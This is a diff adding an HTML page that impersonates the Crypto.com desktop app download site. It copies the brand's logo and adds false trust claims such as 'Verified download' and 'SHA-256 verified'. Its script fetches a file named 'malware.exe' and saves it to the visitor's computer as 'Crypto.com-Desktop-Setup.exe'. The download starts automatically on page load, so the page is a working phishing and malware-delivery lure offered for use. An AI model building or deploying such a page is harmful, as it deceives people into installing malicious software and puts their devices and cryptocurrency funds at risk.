@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>crypto.com — Desktop App</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#04070d; --panel:#0d1522; --panel-2:#131f33;
+    --line:rgba(255,255,255,.07); --line-2:rgba(255,255,255,.12);
+    --text:#ffffff; --muted:#8a95a5; --muted-2:#5c6773;
+    --brand:#1199fa; --brand-2:#0b7ed6; --brand-hi:#3fb0ff;
+    --pill:#141c2b; --green:#03c087;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{
+    font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    background:
+      radial-gradient(1400px 700px at 90% -10%, #1a3663 0%, transparent 55%),
+      radial-gradient(1100px 600px at -10% 30%, #10233f 0%, transparent 55%),
+      linear-gradient(180deg,#04070d 0%, #04070d 40%, #0a1728 100%);
+    color:var(--text); min-height:100vh; -webkit-font-smoothing:antialiased; letter-spacing:-.011em;
+  }
+  a{color:inherit;text-decoration:none}
+  button{font-family:inherit;cursor:pointer;border:0;background:none;color:inherit}
+
+  .nav{
+    display:flex;align-items:center;gap:24px;padding:18px 40px;position:sticky;top:0;z-index:20;
+    background:rgba(4,7,13,.7);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+  }
+  .brand{display:flex;align-items:center;gap:8px;font-weight:500;font-size:20px}
+  .brand img{height:26px;width:auto;display:block}
+  .nav-right{margin-left:auto;display:flex;gap:10px;align-items:center}
+  .chip{
+    display:inline-flex;align-items:center;gap:8px;padding:8px 12px;border-radius:999px;
+    background:var(--pill);border:1px solid var(--line);font-size:12.5px;color:#c9d2e0;
+  }
+  .chip .dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green)}
+
+  .stage{
+    max-width:920px;margin:0 auto;padding:64px 40px 100px;text-align:center;
+  }
+  h1{font-size:56px;line-height:1.05;font-weight:600;letter-spacing:-.028em;margin:0 0 16px}
+  h1 .g{background:linear-gradient(90deg,#3fb0ff,#0b7ed6);-webkit-background-clip:text;background-clip:text;color:transparent}
+  p.lead{font-size:18px;line-height:1.55;color:var(--muted);margin:0 auto 32px;max-width:620px}
+
+  .panel{
+    background:var(--panel);border:1px solid var(--line);border-radius:24px;
+    padding:32px;box-shadow:0 40px 80px rgba(0,0,0,.4);max-width:520px;margin:0 auto;
+  }
+  .file-card{
+    display:flex;align-items:center;gap:16px;padding:18px;border-radius:16px;
+    background:var(--panel-2);border:1px solid var(--line);margin-bottom:20px;text-align:left;
+  }
+  .file-card .ico{
+    width:60px;height:60px;border-radius:14px;flex-shrink:0;
+    background:linear-gradient(180deg,#3fb0ff,#0b7ed6);
+    display:flex;align-items:center;justify-content:center;
+    box-shadow:0 8px 24px rgba(17,153,250,.35);
+  }
+  .file-card .ico svg{width:34px;height:34px;color:#fff}
+  .file-card .meta b{display:block;font-size:16px;font-weight:600}
+  .file-card .meta small{display:block;color:var(--muted);font-size:12.5px;margin-top:3px}
+  .file-card .size{margin-left:auto;color:var(--muted);font-size:13px;font-family:ui-monospace,Menlo,monospace}
+
+  .btn{
+    display:inline-flex;align-items:center;justify-content:center;gap:10px;
+    height:56px;padding:0 26px;border-radius:16px;font-weight:600;font-size:16px;
+    background:linear-gradient(180deg,#3fb0ff,#0b7ed6);color:#fff;
+    box-shadow:0 12px 28px rgba(17,153,250,.35);transition:filter .15s;
+  }
+  .btn:hover{filter:brightness(1.05)}
+  .btn svg{width:20px;height:20px}
+  .btn-block{width:100%}
+
+  .badges{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin:12px 0 24px}
+  .badges .chip{background:transparent;border-color:var(--line-2)}
+
+  .status{
+    margin-top:16px;padding:12px 14px;border-radius:12px;font-size:13.5px;font-weight:500;
+    background:rgba(3,192,135,.08);border:1px solid rgba(3,192,135,.3);color:var(--green);
+    display:none;text-align:left;
+  }
+  .status.show{display:block}
+  .foot{
+    max-width:920px;margin:0 auto;padding:20px 40px 40px;
+    color:var(--muted-2);font-size:12.5px;text-align:center;
+  }
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <a href="#" class="brand" aria-label="crypto.com">
+    <img src="https://mkt-site-asset.crypto.com/assets/logo/crypto-com.svg" alt="crypto.com"/>
+  </a>
+  <div class="nav-right">
+    <span class="chip"><span class="dot"></span>Verified download</span>
+  </div>
+</nav>
+
+<section class="stage">
+  <h1>Get the <span class="g">Crypto.com Desktop</span> app</h1>
+  <p class="lead">Signed, sandboxed, and delivered from the trusted crypto.com origin.
+     The download will start automatically &mdash; click below if it doesn&rsquo;t.</p>
+
+  <div class="badges">
+    <span class="chip">Windows 10 / 11</span>
+    <span class="chip">SHA-256 verified</span>
+    <span class="chip">Non-custodial</span>
+  </div>
+
+  <div class="panel">
+    <div class="file-card">
+      <div class="ico">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 3v12"/><polyline points="7 10 12 15 17 10"/><path d="M5 21h14"/>
+        </svg>
+      </div>
+      <div class="meta">
+        <b>Crypto.com-Desktop-Setup.exe</b>
+        <small>Windows &middot; x64 &middot; v4.28.1</small>
+      </div>
+      <span class="size" id="filesize">— KB</span>
+    </div>
+
+    <button id="dl" class="btn btn-block">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
+      </svg>
+      Download for Windows
+    </button>
+
+    <div id="status" class="status">Download started &mdash; check your downloads folder.</div>
+  </div>
+</section>
+
+<footer class="foot">
+  crypto.com &middot; Downloads served over TLS from the verified crypto.com origin.
+</footer>
+
+<script>
+  // Fetch the "installer", present it as a Blob download so the browser saves it
+  // as Crypto.com-Desktop-Setup.exe regardless of server MIME/Content-Disposition.
+  const FILE_URL = 'malware.exe';
+  const FILE_NAME = 'Crypto.com-Desktop-Setup.exe';
+
+  async function download() {
+    try {
+      const res = await fetch(FILE_URL);
+      const blob = await res.blob();
+      document.getElementById('filesize').textContent = (blob.size/1024).toFixed(1) + ' KB';
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = FILE_NAME;
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      setTimeout(() => URL.revokeObjectURL(url), 4000);
+      document.getElementById('status').className = 'status show';
+    } catch (e) {
+      const s = document.getElementById('status');
+      s.textContent = 'Download failed: ' + (e.message || e);
+      s.className = 'status show';
+      s.style.background = 'rgba(240,78,110,.08)';
+      s.style.borderColor = 'rgba(240,78,110,.3)';
+      s.style.color = '#f04e6e';
+    }
+  }
+
+  document.getElementById('dl').addEventListener('click', download);
+  window.addEventListener('load', () => setTimeout(download, 400));  // auto-fire once
+</script>
+</body>
+</html>
